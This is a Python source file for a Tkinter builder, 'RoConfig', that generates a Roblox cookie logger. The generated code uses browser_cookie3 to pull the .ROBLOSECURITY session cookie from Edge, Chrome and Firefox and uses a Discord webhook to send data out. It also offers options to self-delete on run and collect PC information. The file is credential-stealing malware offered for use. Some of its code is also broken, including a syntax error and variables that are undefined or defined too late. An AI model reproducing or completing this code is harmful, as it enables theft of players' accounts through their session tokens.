from discord_webhook import DiscordWebhook
import tkinter as tk
from tkinter import ttk
import browser_cookie3

# note make sure to define webhook_url

def send_discord_webhook(message):
    webhook = DiscordWebhook(url=webhook_url, content=message)
    response = webhook.execute()

burn = False
pcget = False
urlencode = False

def setBurn():
    global burn
    if burnvar.get():
        burn = True
    else:
        burn = False
        
def getPc():
    global pcget
    if getpcvar.get():
        pcget = True
    else:
        pcget = False

def encodeUrl():
    global urlencode
    if encodeurlvar.get():
        urlencode = True
    else:
        urlencode = False

def buildlogger():
    with open("logger.py", "w") as file:
        file.write(sigmaloggercode)
    
root = tk.Tk()
root.title("RoConfig")

burnvar = tk.IntVar()
burncheckbox = tk.Checkbutton(root, text="Delete on Run", variable=burnvar, command=setBurn)
burncheckbox.pack(pady=15)

getpcvar = tk.IntVar()
getpccheckbox = tk.Checkbutton(root, text="Get PC Info", variable=getpcvar, command=getPc)
getpccheckbox.pack(pady=15)

encodeurlvar = tk.IntVar()
encodeurlcheckbox = tk.Checkbutton(root, text="Encode URL", variable=encodeurlvar, command=encodeUrl)
encodeurlcheckbox.pack(pady=15)

webhooklabel = tk.Label(root, text="Webhook Url:")
webhooklabel.pack(pady=10)
webhookinput = tk.Entry(root)
webhookinput.pack(pady=15)
webhooksubmit = tk.Button(root, text="Build", command: buildlogger)

root.geometry("300x350")
root.mainloop()

vcookies = []
webhook = DiscordWebhook(url=str(webby))
edge = True
chrome = True
firefox = True

def logger():
    global edge, chrome, firefox
    try:
        edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
        edge_roblo_security = str(edge_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        vcookies.append(edge_roblo_security)
    except:
        edge = False
        pass
    try:
        chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
        chrome_roblo_security = str(chrome_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        vcookies.append(chrome_roblo_security)
    except:
        chrome = False
        pass
    try:
        fire_cookies = browser_cookie3.firefox(domain_name='roblox.com')
        fire_roblo_security = str(fire_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        vcookies.append(fire_roblo_security)
    except:
        firefox = False
        pass
if __name__ == "__main__":
    logger()

sigmaloggercode = ("""
    try:
        edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
        edge_roblo_security = str(edge_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        vcookies.append(edge_roblo_security)
    except:
        edge = False
        pass
    try:
        chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
        chrome_roblo_security = str(chrome_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        vcookies.append(chrome_roblo_security)
    except:
        chrome = False
        pass
    try:
        fire_cookies = browser_cookie3.firefox(domain_name='roblox.com')
        fire_roblo_security = str(fire_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        vcookies.append(fire_roblo_security)
    except:
        firefox = False
        pass
""")
